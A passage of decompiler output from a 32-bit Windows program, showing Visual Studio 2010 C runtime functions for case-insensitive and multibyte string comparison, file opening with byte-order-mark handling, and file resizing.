      }
      else {
        iVar4 = (int)_Str1 - (int)_Str2;
        do {
          iVar2 = __tolower_l((uint)((byte *)_Str2)[iVar4],(_locale_t)&local_14);
          iVar3 = __tolower_l((uint)(byte)*_Str2,(_locale_t)&local_14);
          _Str2 = (char *)((byte *)_Str2 + 1);
          if (iVar2 == 0) break;
        } while (iVar2 == iVar3);
        iVar2 = iVar2 - iVar3;
      }
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
    }
  }
  return iVar2;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __stricmp
// 
// Library: Visual Studio 2010 Release

int __cdecl __stricmp(char *_Str1,char *_Str2)

{
  int *piVar1;
  int iVar2;
  
  if (_DAT_003d7cf8 != 0) {
    iVar2 = __stricmp_l(_Str1,_Str2,(_locale_t)0x0);
    return iVar2;
  }
  if ((_Str1 != (char *)0x0) && (_Str2 != (char *)0x0)) {
    iVar2 = ___ascii_stricmp(_Str1,_Str2);
    return iVar2;
  }
  piVar1 = __errno();
  *piVar1 = 0x16;
  FUN_003b60f9();
  return 0x7fffffff;
}



// Library Function - Single Match
//  __strnicmp_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __strnicmp_l(char *_Str1,char *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  if (_MaxCount == 0) {
    iVar2 = 0;
  }
  else {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
    if ((_Str1 == (char *)0x0) || (_Str2 == (char *)0x0)) {
      piVar1 = __errno();
      *piVar1 = 0x16;
      FUN_003b60f9();
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      iVar2 = 0x7fffffff;
    }
    else {
      if (_MaxCount < 0x80000000) {
        if ((local_14.locinfo)->lc_category[0].wlocale == (wchar_t *)0x0) {
          iVar2 = ___ascii_strnicmp(_Str1,_Str2,_MaxCount);
        }
        else {
          iVar4 = (int)_Str1 - (int)_Str2;
          do {
            iVar2 = __tolower_l((uint)((byte *)_Str2)[iVar4],(_locale_t)&local_14);
            iVar3 = __tolower_l((uint)(byte)*_Str2,(_locale_t)&local_14);
            _Str2 = (char *)((byte *)_Str2 + 1);
            _MaxCount = _MaxCount - 1;
            if ((_MaxCount == 0) || (iVar2 == 0)) break;
          } while (iVar2 == iVar3);
          iVar2 = iVar2 - iVar3;
        }
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
      }
      else {
        piVar1 = __errno();
        *piVar1 = 0x16;
        FUN_003b60f9();
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        iVar2 = 0x7fffffff;
      }
    }
  }
  return iVar2;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __strnicmp
// 
// Library: Visual Studio 2010 Release

int __cdecl __strnicmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  int *piVar1;
  int iVar2;
  
  if (_DAT_003d7cf8 != 0) {
    iVar2 = __strnicmp_l(_Str1,_Str2,_MaxCount,(_locale_t)0x0);
    return iVar2;
  }
  if (((_Str1 != (char *)0x0) && (_Str2 != (char *)0x0)) && (_MaxCount < 0x80000000)) {
    iVar2 = ___ascii_strnicmp(_Str1,_Str2,_MaxCount);
    return iVar2;
  }
  piVar1 = __errno();
  *piVar1 = 0x16;
  FUN_003b60f9();
  return 0x7fffffff;
}



int __cdecl FUN_003bea8c(undefined4 *param_1,LPCSTR param_2,uint param_3,int param_4,byte param_5)

{
  byte *pbVar1;
  code *pcVar2;
  byte bVar3;
  uint *in_EAX;
  errno_t eVar4;
  uint uVar5;
  ulong *puVar6;
  int *piVar7;
  DWORD DVar8;
  long lVar9;
  int iVar10;
  HANDLE pvVar11;
  byte bVar12;
  int iVar13;
  bool bVar14;
  longlong lVar15;
  int iVar16;
  _SECURITY_ATTRIBUTES local_34;
  uint local_28;
  HANDLE local_24;
  uint local_20;
  DWORD local_1c;
  uint local_18;
  uint local_14;
  uint local_10;
  int local_c;
  char local_8;
  byte local_7;
  byte local_6;
  byte local_5;
  
  bVar14 = (param_3 & 0x80) == 0;
  local_28 = 0;
  local_6 = 0;
  local_c = 0;
  local_34.nLength = 0xc;
  local_34.lpSecurityDescriptor = (LPVOID)0x0;
  if (bVar14) {
    local_5 = 0;
  }
  else {
    local_5 = 0x10;
  }
  local_34.bInheritHandle = ZEXT14(bVar14);
  eVar4 = __get_fmode((int *)&local_28);
  if (eVar4 != 0) {
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    pcVar2 = (code *)swi(3);
    iVar13 = (*pcVar2)();
    return iVar13;
  }
  if (((param_3 & 0x8000) == 0) && (((param_3 & 0x74000) != 0 || (local_28 != 0x8000)))) {
    local_5 = local_5 | 0x80;
  }
  uVar5 = param_3 & 3;
  if (uVar5 == 0) {
    local_10 = 0x80000000;
  }
  else {
    if (uVar5 == 1) {
      if (((param_3 & 8) == 0) || ((param_3 & 0x70000) == 0)) {
        local_10 = 0x40000000;
        goto LAB_003beb4e;
      }
    }
    else {
      if (uVar5 != 2) goto LAB_003beb0e;
    }
    local_10 = 0xc0000000;
  }
LAB_003beb4e:
  if (param_4 == 0x10) {
    local_18 = 0;
  }
  else {
    if (param_4 == 0x20) {
      local_18 = 1;
    }
    else {
      if (param_4 == 0x30) {
        local_18 = 2;
      }
      else {
        if (param_4 == 0x40) {
          local_18 = 3;
        }
        else {
          if (param_4 != 0x80) {
LAB_003beb0e:
            puVar6 = ___doserrno();
            *puVar6 = 0;
            *in_EAX = 0xffffffff;
            piVar7 = __errno();
            *piVar7 = 0x16;
            FUN_003b60f9();
            return 0x16;
          }
          local_18 = (uint)(local_10 == 0x80000000);
        }
      }
    }
  }
  uVar5 = param_3 & 0x700;
  if (uVar5 < 0x401) {
    if ((uVar5 == 0x400) || (uVar5 == 0)) {
      local_1c = 3;
    }
    else {
      if (uVar5 == 0x100) {
        local_1c = 4;
      }
      else {
        if (uVar5 == 0x200) goto LAB_003bec10;
        if (uVar5 != 0x300) goto LAB_003bebf0;
        local_1c = 2;
      }
    }
  }
  else {
    if (uVar5 != 0x500) {
      if (uVar5 == 0x600) {
LAB_003bec10:
        local_1c = 5;
        goto LAB_003bec20;
      }
      if (uVar5 != 0x700) {
LAB_003bebf0:
        puVar6 = ___doserrno();
        *puVar6 = 0;
        *in_EAX = 0xffffffff;
        piVar7 = __errno();
        *piVar7 = 0x16;
        FUN_003b60f9();
        return 0x16;
      }
    }
    local_1c = 1;
  }
LAB_003bec20:
  local_14 = 0x80;
  if (((param_3 & 0x100) != 0) && (-1 < (char)(~(byte)DAT_003d8030 & param_5))) {
    local_14 = 1;
  }
  if ((param_3 & 0x40) != 0) {
    local_14 = local_14 | 0x4000000;
    local_10 = local_10 | 0x10000;
    local_18 = local_18 | 4;
  }
  if ((param_3 & 0x1000) != 0) {
    local_14 = local_14 | 0x100;
  }
  if ((param_3 & 0x20) == 0) {
    if ((param_3 & 0x10) != 0) {
      local_14 = local_14 | 0x10000000;
    }
  }
  else {
    local_14 = local_14 | 0x8000000;
  }
  uVar5 = __alloc_osfhnd();
  *in_EAX = uVar5;
  if (uVar5 == 0xffffffff) {
    puVar6 = ___doserrno();
    *puVar6 = 0;
    *in_EAX = 0xffffffff;
    piVar7 = __errno();
    *piVar7 = 0x18;
    piVar7 = __errno();
    return *piVar7;
  }
  *param_1 = 1;
  local_24 = CreateFileA(param_2,local_10,local_18,(LPSECURITY_ATTRIBUTES)&local_34,local_1c,
                         local_14,(HANDLE)0x0);
  if (local_24 == (HANDLE)0xffffffff) {
    if (((local_10 & 0xc0000000) == 0xc0000000) && ((param_3 & 1) != 0)) {
      local_10 = local_10 & 0x7fffffff;
      local_24 = CreateFileA(param_2,local_10,local_18,(LPSECURITY_ATTRIBUTES)&local_34,local_1c,
                             local_14,(HANDLE)0x0);
      if (local_24 != (HANDLE)0xffffffff) goto LAB_003bed48;
    }
    pbVar1 = (byte *)((&DAT_003ea060)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    DVar8 = GetLastError();
    __dosmaperr(DVar8);
    goto LAB_003bed39;
  }
LAB_003bed48:
  DVar8 = GetFileType(local_24);
  if (DVar8 == 0) {
    pbVar1 = (byte *)((&DAT_003ea060)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    DVar8 = GetLastError();
    __dosmaperr(DVar8);
    CloseHandle(local_24);
    if (DVar8 == 0) {
      piVar7 = __errno();
      *piVar7 = 0xd;
    }
    goto LAB_003bed39;
  }
  if (DVar8 == 2) {
    local_5 = local_5 | 0x40;
  }
  else {
    if (DVar8 == 3) {
      local_5 = local_5 | 8;
    }
  }
  __set_osfhnd(*in_EAX,(intptr_t)local_24);
  bVar12 = local_5 | 1;
  *(byte *)((&DAT_003ea060)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40) = bVar12;
  pbVar1 = (byte *)((&DAT_003ea060)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 & 0x80;
  local_7 = local_5 & 0x48;
  if (local_7 == 0) {
    bVar3 = local_5 & 0x80;
    local_5 = bVar12;
    if (bVar3 == 0) goto LAB_003bf0ae;
    if ((param_3 & 2) == 0) goto LAB_003bee7c;
    lVar9 = __lseek_nolock(*in_EAX,-1,2);
    if (lVar9 == -1) {
      puVar6 = ___doserrno();
      bVar12 = local_5;
      if (*puVar6 == 0x83) goto LAB_003bee7c;
    }
    else {
      local_8 = '\0';
      iVar13 = __read_nolock(*in_EAX,&local_8,1);
      if ((((iVar13 != 0) || (local_8 != '\x1a')) ||
          (iVar13 = __chsize_nolock(*in_EAX,(longlong)lVar9), iVar13 != -1)) &&
         (lVar9 = __lseek_nolock(*in_EAX,0,0), bVar12 = local_5, lVar9 != -1)) goto LAB_003bee7c;
    }
LAB_003bee2d:
    __close_nolock(*in_EAX);
    goto LAB_003bed39;
  }
LAB_003bee7c:
  local_5 = bVar12;
  if ((local_5 & 0x80) != 0) {
    if ((param_3 & 0x74000) == 0) {
      if ((local_28 & 0x74000) == 0) {
        param_3 = param_3 | 0x4000;
      }
      else {
        param_3 = param_3 | local_28 & 0x74000;
      }
    }
    uVar5 = param_3 & 0x74000;
    if (uVar5 == 0x4000) {
      local_6 = 0;
    }
    else {
      if ((uVar5 == 0x10000) || (uVar5 == 0x14000)) {
        if ((param_3 & 0x301) == 0x301) goto LAB_003beeeb;
      }
      else {
        if ((uVar5 == 0x20000) || (uVar5 == 0x24000)) {
LAB_003beeeb:
          local_6 = 2;
        }
        else {
          if ((uVar5 == 0x40000) || (uVar5 == 0x44000)) {
            local_6 = 1;
          }
        }
      }
    }
    if (((param_3 & 0x70000) != 0) && (local_20 = 0, (local_5 & 0x40) == 0)) {
      uVar5 = local_10 & 0xc0000000;
      if (uVar5 == 0x40000000) {
        if (local_1c == 0) goto LAB_003bf0ae;
        if (2 < local_1c) {
          if (local_1c < 5) {
            lVar15 = __lseeki64_nolock(*in_EAX,0,2);
            if (lVar15 == 0) goto LAB_003bef53;
            lVar15 = __lseeki64_nolock(*in_EAX,0,0);
            uVar5 = (uint)lVar15 & (uint)((ulonglong)lVar15 >> 0x20);
            goto LAB_003bf018;
          }
LAB_003bef4a:
          if (local_1c != 5) goto LAB_003bf0ae;
        }
LAB_003bef53:
        iVar13 = 0;
        if (local_6 == 1) {
          local_20 = 0xbfbbef;
          iVar16 = 3;
        }
        else {
          if (local_6 != 2) goto LAB_003bf0ae;
          local_20 = 0xfeff;
          iVar16 = 2;
        }
        do {
          iVar10 = __write(*in_EAX,(void *)((int)&local_20 + iVar13),iVar16 - iVar13);
          if (iVar10 == -1) goto LAB_003bee2d;
          iVar13 = iVar13 + iVar10;
        } while (iVar13 < iVar16);
      }
      else {
        if (uVar5 != 0x80000000) {
          if ((uVar5 == 0xc0000000) && (local_1c != 0)) {
            if (2 < local_1c) {
              if (4 < local_1c) goto LAB_003bef4a;
              lVar15 = __lseeki64_nolock(*in_EAX,0,2);
              if (lVar15 != 0) {
                lVar15 = __lseeki64_nolock(*in_EAX,0,0);
                if (lVar15 == -1) goto LAB_003bee2d;
                goto LAB_003bef9e;
              }
            }
            goto LAB_003bef53;
          }
          goto LAB_003bf0ae;
        }
LAB_003bef9e:
        iVar13 = __read_nolock(*in_EAX,&local_20,3);
        if (iVar13 == -1) goto LAB_003bee2d;
        if (iVar13 == 2) {
LAB_003bf025:
          if ((local_20 & 0xffff) == 0xfffe) {
            __close_nolock(*in_EAX);
            piVar7 = __errno();
            *piVar7 = 0x16;
            return 0x16;
          }
          if ((local_20 & 0xffff) == 0xfeff) {
            lVar9 = __lseek_nolock(*in_EAX,2,0);
            if (lVar9 == -1) goto LAB_003bee2d;
            local_6 = 2;
            goto LAB_003bf0ae;
          }
        }
        else {
          if (iVar13 == 3) {
            if (local_20 == 0xbfbbef) {
              local_6 = 1;
              goto LAB_003bf0ae;
            }
            goto LAB_003bf025;
          }
        }
        uVar5 = __lseek_nolock(*in_EAX,0,0);
LAB_003bf018:
        if (uVar5 == 0xffffffff) goto LAB_003bee2d;
      }
    }
  }
LAB_003bf0ae:
  pbVar1 = (byte *)((&DAT_003ea060)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 ^ (*pbVar1 ^ local_6) & 0x7f;
  pbVar1 = (byte *)((&DAT_003ea060)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = (char)(param_3 >> 0x10) << 7 | *pbVar1 & 0x7f;
  if ((local_7 == 0) && ((param_3 & 8) != 0)) {
    pbVar1 = (byte *)((&DAT_003ea060)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 | 0x20;
  }
  if ((local_10 & 0xc0000000) != 0xc0000000) {
    return local_c;
  }
  if ((param_3 & 1) == 0) {
    return local_c;
  }
  CloseHandle(local_24);
  pvVar11 = CreateFileA(param_2,local_10 & 0x7fffffff,local_18,(LPSECURITY_ATTRIBUTES)&local_34,3,
                        local_14,(HANDLE)0x0);
  if (pvVar11 != (HANDLE)0xffffffff) {
    *(HANDLE *)((*in_EAX & 0x1f) * 0x40 + (&DAT_003ea060)[(int)*in_EAX >> 5]) = pvVar11;
    return local_c;
  }
  DVar8 = GetLastError();
  __dosmaperr(DVar8);
  pbVar1 = (byte *)((&DAT_003ea060)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 & 0xfe;
  __free_osfhnd(*in_EAX);
LAB_003bed39:
  piVar7 = __errno();
  return *piVar7;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __sopen_helper
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl
__sopen_helper(char *_Filename,int _OFlag,int _ShFlag,int _PMode,int *_PFileHandle,int _BSecure)

{
  int *piVar1;
  errno_t eVar2;
  undefined4 local_20 [5];
  undefined4 uStack12;
  undefined *local_8;
  
  local_8 = &DAT_003d30e0;
  uStack12 = 0x3bf1cc;
  local_20[0] = 0;
  if (((_PFileHandle == (int *)0x0) || (*_PFileHandle = -1, _Filename == (char *)0x0)) ||
     ((_BSecure != 0 && ((_PMode & 0xfffffe7fU) != 0)))) {
    piVar1 = __errno();
    eVar2 = 0x16;
    *piVar1 = 0x16;
    FUN_003b60f9();
  }
  else {
    local_8 = (undefined *)0x0;
    eVar2 = FUN_003bea8c(local_20,_Filename,_OFlag,_ShFlag,(byte)_PMode);
    local_8 = (undefined *)0xfffffffe;
    FUN_003bf256();
    if (eVar2 != 0) {
      *_PFileHandle = -1;
    }
  }
  return eVar2;
}



void FUN_003bf256(void)

{
  byte *pbVar1;
  int unaff_EBP;
  uint *unaff_ESI;
  int unaff_EDI;
  
  if (*(int *)(unaff_EBP + -0x1c) != unaff_EDI) {
    if (*(int *)(unaff_EBP + -0x20) != unaff_EDI) {
      pbVar1 = (byte *)((&DAT_003ea060)[(int)*unaff_ESI >> 5] + 4 + (*unaff_ESI & 0x1f) * 0x40);
      *pbVar1 = *pbVar1 & 0xfe;
    }
    __unlock_fhandle(*unaff_ESI);
  }
  return;
}



// Library Function - Single Match
//  __sopen_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl
__sopen_s(int *_FileHandle,char *_Filename,int _OpenFlag,int _ShareFlag,int _PermissionMode)

{
  errno_t eVar1;
  
  eVar1 = __sopen_helper(_Filename,_OpenFlag,_ShareFlag,_PermissionMode,_FileHandle,1);
  return eVar1;
}



// Library Function - Single Match
//  __mbsnbicmp_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __mbsnbicmp_l(uchar *_Str1,uchar *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  size_t sVar1;
  uchar *puVar2;
  int iVar3;
  int *piVar4;
  uint uVar5;
  byte *pbVar6;
  _LocaleUpdate local_1c [4];
  int local_18;
  int local_14;
  char local_10;
  ushort local_c;
  ushort local_8;
  
  _LocaleUpdate::_LocaleUpdate(local_1c,_Locale);
  if (_MaxCount == 0) {
    if (local_10 != '\0') {
      *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
    }
    iVar3 = 0;
  }
  else {
    if (*(int *)(local_18 + 8) == 0) {
      iVar3 = __strnicmp((char *)_Str1,(char *)_Str2,_MaxCount);
      if (local_10 != '\0') {
        *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      }
    }
    else {
      if (_Str1 == (uchar *)0x0) {
        piVar4 = __errno();
        *piVar4 = 0x16;
        FUN_003b60f9();
        if (local_10 != '\0') {
          *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
        }
        iVar3 = 0x7fffffff;
      }
      else {
        if (_Str2 != (uchar *)0x0) {
          do {
            uVar5 = (uint)*_Str1;
            sVar1 = _MaxCount - 1;
            puVar2 = _Str1 + 1;
            if ((*(byte *)(uVar5 + 0x1d + local_18) & 4) == 0) {
              if ((*(byte *)(uVar5 + local_18 + 0x1d) & 0x10) != 0) {
                uVar5 = (uint)*(byte *)(uVar5 + local_18 + 0x11d);
              }
              local_c = (ushort)uVar5;
              _Str1 = puVar2;
LAB_003bf3f7:
              uVar5 = (uint)*_Str2;
              pbVar6 = _Str2 + 1;
              if ((*(byte *)(uVar5 + 0x1d + local_18) & 4) == 0) {
                if ((*(byte *)(uVar5 + local_18 + 0x1d) & 0x10) != 0) {
                  uVar5 = (uint)*(byte *)(uVar5 + local_18 + 0x11d);
                }
                goto LAB_003bf467;
              }
              if (sVar1 == 0) {
LAB_003bf40d:
                _MaxCount = sVar1;
                local_8 = 0;
              }
              else {
                sVar1 = _MaxCount - 2;
                if (*pbVar6 == 0) goto LAB_003bf40d;
                local_8 = CONCAT11(*_Str2,*pbVar6);
                pbVar6 = _Str2 + 2;
                _MaxCount = sVar1;
                if ((local_8 < *(ushort *)(local_18 + 0x10)) ||
                   (*(ushort *)(local_18 + 0x12) <= local_8 &&
                    local_8 != *(ushort *)(local_18 + 0x12))) {
                  if ((*(ushort *)(local_18 + 0x16) <= local_8) &&
                     (local_8 < *(ushort *)(local_18 + 0x18) ||
                      local_8 == *(ushort *)(local_18 + 0x18))) {
                    local_8 = local_8 + *(short *)(local_18 + 0x1a);
                  }
                }
                else {
                  local_8 = local_8 + *(short *)(local_18 + 0x14);
                }
              }
            }
            else {
              if (sVar1 != 0) {
                if (*puVar2 == '\0') {
                  local_c = 0;
                  _Str1 = puVar2;
                }
                else {
                  local_c = CONCAT11(*_Str1,*puVar2);
                  _Str1 = _Str1 + 2;
                  if ((local_c < *(ushort *)(local_18 + 0x10)) ||
                     (*(ushort *)(local_18 + 0x12) <= local_c &&
                      local_c != *(ushort *)(local_18 + 0x12))) {
                    if ((*(ushort *)(local_18 + 0x16) <= local_c) &&
                       (local_c < *(ushort *)(local_18 + 0x18) ||
                        local_c == *(ushort *)(local_18 + 0x18))) {
                      local_c = local_c + *(short *)(local_18 + 0x1a);
                    }
                  }
                  else {
                    local_c = local_c + *(short *)(local_18 + 0x14);
                  }
                }
                goto LAB_003bf3f7;
              }
              uVar5 = (uint)*_Str2;
              if ((*(byte *)(uVar5 + 0x1d + local_18) & 4) != 0) {
LAB_003bf481:
                if (local_10 != '\0') {
                  *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
                }
                return 0;
              }
              local_c = 0;
              pbVar6 = _Str2;
              _Str1 = puVar2;
LAB_003bf467:
              local_8 = (ushort)uVar5;
              _MaxCount = sVar1;
            }
            if (local_8 != local_c) {
              iVar3 = (-(uint)(local_8 < local_c) & 2) - 1;
              if (local_10 == '\0') {
                return iVar3;
              }
              *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
              return iVar3;
            }
            if ((local_c == 0) || (_Str2 = pbVar6, _MaxCount == 0)) goto LAB_003bf481;
          } while( true );
        }
        piVar4 = __errno();
        *piVar4 = 0x16;
        FUN_003b60f9();
        if (local_10 != '\0') {
          *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
        }
        iVar3 = 0x7fffffff;
      }
    }
  }
  return iVar3;
}



// Library Function - Single Match
//  __mbsnbicmp
// 
// Library: Visual Studio 2010 Release

int __cdecl __mbsnbicmp(uchar *_Str1,uchar *_Str2,size_t _MaxCount)

{
  int iVar1;
  
  iVar1 = __mbsnbicmp_l(_Str1,_Str2,_MaxCount,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  __mbsnbcmp_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __mbsnbcmp_l(uchar *_Str1,uchar *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  size_t sVar1;
  int iVar2;
  int *piVar3;
  ushort uVar4;
  uint uVar5;
  byte *pbVar6;
  byte *pbVar7;
  _LocaleUpdate local_14 [4];
  int local_10;
  int local_c;
  char local_8;
  
  if (_MaxCount == 0) {
    return 0;
  }
  _LocaleUpdate::_LocaleUpdate(local_14,_Locale);
  if (*(int *)(local_10 + 8) == 0) {
    iVar2 = _strncmp((char *)_Str1,(char *)_Str2,_MaxCount);
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  else {
    if (_Str1 == (uchar *)0x0) {
      piVar3 = __errno();
      *piVar3 = 0x16;
      FUN_003b60f9();
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      iVar2 = 0x7fffffff;
    }
    else {
      if (_Str2 != (uchar *)0x0) {
        do {
          uVar5 = (uint)*_Str1;
          sVar1 = _MaxCount - 1;
          pbVar6 = _Str1 + 1;
          if ((*(byte *)(uVar5 + 0x1d + local_10) & 4) == 0) {
LAB_003bf5b5:
            uVar4 = (ushort)uVar5;
            uVar5 = (uint)*_Str2;
            pbVar7 = _Str2 + 1;
            if ((*(byte *)(uVar5 + 0x1d + local_10) & 4) != 0) {
              if (sVar1 != 0) {
                sVar1 = _MaxCount - 2;
                if (*pbVar7 != 0) {
                  uVar5 = (uint)CONCAT11(*_Str2,*pbVar7);
                  pbVar7 = _Str2 + 2;
                  goto LAB_003bf5e3;
                }
              }
              _MaxCount = sVar1;
              uVar5 = 0;
              sVar1 = _MaxCount;
            }
          }
          else {
            if (sVar1 != 0) {
              if (*pbVar6 == 0) {
                uVar5 = 0;
              }
              else {
                uVar5 = (uint)CONCAT11(*_Str1,*pbVar6);
                pbVar6 = _Str1 + 2;
              }
              goto LAB_003bf5b5;
            }
            uVar5 = (uint)*_Str2;
            uVar4 = 0;
            pbVar7 = _Str2;
            if ((*(byte *)(uVar5 + 0x1d + local_10) & 4) != 0) {
LAB_003bf58a:
              if (local_8 != '\0') {
                *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
              }
              return 0;
            }
          }
LAB_003bf5e3:
          _MaxCount = sVar1;
          if ((ushort)uVar5 != uVar4) {
            iVar2 = (-(uint)((ushort)uVar5 < uVar4) & 2) - 1;
            if (local_8 == '\0') {
              return iVar2;
            }
            *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
            return iVar2;
          }
          if ((uVar4 == 0) || (_Str1 = pbVar6, _Str2 = pbVar7, _MaxCount == 0)) goto LAB_003bf58a;
        } while( true );
      }
      piVar3 = __errno();
      *piVar3 = 0x16;
      FUN_003b60f9();
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      iVar2 = 0x7fffffff;
    }
  }
  return iVar2;
}



// Library Function - Single Match
//  __mbsnbcmp
// 
// Library: Visual Studio 2010 Release

int __cdecl __mbsnbcmp(uchar *_Str1,uchar *_Str2,size_t _MaxCount)

{
  int iVar1;
  
  iVar1 = __mbsnbcmp_l(_Str1,_Str2,_MaxCount,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  ___initconout
// 
// Library: Visual Studio 2010 Release

void __cdecl ___initconout(void)

{
  DAT_003d7280 = CreateFileW(L"CONOUT$",0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  return;
}



// Library Function - Single Match
//  ___ascii_strnicmp
// 
// Library: Visual Studio 2010 Release

int __cdecl ___ascii_strnicmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  byte bVar1;
  byte bVar2;
  bool bVar3;
  
  if (_MaxCount != 0) {
    do {
      bVar2 = *_Str1;
      bVar1 = *_Str2;
      if ((bVar2 == 0) || (bVar1 == 0)) break;
      _Str1 = (char *)((byte *)_Str1 + 1);
      _Str2 = (char *)((byte *)_Str2 + 1);
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        bVar2 = bVar2 + 0x20;
      }
      if ((0x40 < bVar1) && (bVar1 < 0x5b)) {
        bVar1 = bVar1 + 0x20;
      }
      bVar3 = bVar2 < bVar1;
      if (bVar2 != bVar1) goto LAB_003bf6c1;
      _MaxCount = _MaxCount - 1;
    } while (_MaxCount != 0);
    _MaxCount = 0;
    bVar3 = bVar2 < bVar1;
    if (bVar2 != bVar1) {
LAB_003bf6c1:
      _MaxCount = 0xffffffff;
      if (!bVar3) {
        _MaxCount = 1;
      }
    }
  }
  return _MaxCount;
}



// Library Function - Single Match
//  __chsize_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __chsize_nolock(int _FileHandle,longlong _Size)

{
  int iVar1;
  HANDLE pvVar2;
  LPVOID _Buf;
  int *piVar3;
  int iVar4;
  uint uVar5;
  ulong *puVar6;
  BOOL BVar7;
  uint uVar8;
  int iVar9;
  bool bVar10;
  bool bVar11;
  longlong lVar12;
  longlong lVar13;
  DWORD DVar14;
  SIZE_T dwBytes;
  uint local_14;
  uint local_10;
  
  local_14 = 0;
  local_10 = 0;
  lVar12 = __lseeki64_nolock(_FileHandle,0,1);
  if (lVar12 == -1) goto LAB_003bf759;
  lVar13 = __lseeki64_nolock(_FileHandle,0,2);
  iVar4 = (int)((ulonglong)lVar13 >> 0x20);
  if (lVar13 == -1) goto LAB_003bf759;
  uVar8 = (uint)_Size - (uint)lVar13;
  uVar5 = (uint)((uint)_Size < (uint)lVar13);
  iVar1 = _Size._4_4_ - iVar4;
  iVar9 = iVar1 - uVar5;
  if ((iVar9 < 0) ||
     ((iVar9 == 0 || (SBORROW4(_Size._4_4_,iVar4) != SBORROW4(iVar1,uVar5)) != iVar9 < 0 &&
      (uVar8 == 0)))) {
    if ((iVar9 < 1) && (iVar9 < 0)) {
      lVar13 = __lseeki64_nolock(_FileHandle,_Size,0);
      if (lVar13 == -1) goto LAB_003bf759;
      pvVar2 = (HANDLE)__get_osfhandle(_FileHandle);
      BVar7 = SetEndOfFile(pvVar2);
      local_14 = (BVar7 != 0) - 1;
      local_10 = (int)local_14 >> 0x1f;
      if ((local_14 & local_10) == 0xffffffff) {
        piVar3 = __errno();
        *piVar3 = 0xd;
        puVar6 = ___doserrno();
        DVar14 = GetLastError();
        *puVar6 = DVar14;
        goto LAB_003bf857;
      }
    }
  }
  else {
    dwBytes = 0x1000;
    DVar14 = 8;
    pvVar2 = GetProcessHeap();
    _Buf = HeapAlloc(pvVar2,DVar14,dwBytes);
    if (_Buf == (LPVOID)0x0) {
      piVar3 = __errno();
      *piVar3 = 0xc;
      goto LAB_003bf759;
    }
    iVar4 = __setmode_nolock(_FileHandle,0x8000);
    while( true ) {
      uVar5 = uVar8;
      if ((-1 < iVar9) && ((0 < iVar9 || (0xfff < uVar8)))) {
        uVar5 = 0x1000;
      }
      uVar5 = __write_nolock(_FileHandle,_Buf,uVar5);
      if (uVar5 == 0xffffffff) break;
      bVar10 = uVar8 < uVar5;
      uVar8 = uVar8 - uVar5;
      bVar11 = SBORROW4(iVar9,(int)uVar5 >> 0x1f);
      iVar1 = iVar9 - ((int)uVar5 >> 0x1f);
      iVar9 = iVar1 - (uint)bVar10;
      if ((iVar9 < 0) ||
